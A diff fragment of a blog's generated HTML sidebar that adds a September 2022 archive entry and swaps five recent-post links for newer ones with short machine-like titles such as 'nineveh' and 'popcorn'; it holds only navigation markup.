-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
     </div>
   </div>
 
@@ -720,23 +818,23 @@ line 3 of code
       <ul>
         
           <li>
-            <a href="/2022/08/30/Networked/">Networked</a>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
           </li>
         
           <li>
-            <a href="/2022/08/29/Buff/">Buff</a>
+            <a href="/2022/09/06/haircut/">haircut</a>
           </li>
         
           <li>
-            <a href="/2022/08/29/Arctic/">Arctic</a>
+            <a href="/2022/09/06/cronos/">cronos</a>
           </li>
         
           <li>
-            <a href="/2022/08/28/Devel/">Devel</a>
+            <a href="/2022/09/06/bastard/">bastard</a>
           </li>
         
           <li>
-            <a href="/2022/07/28/oscp/">oscp</a>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
           </li>
         
       </ul>
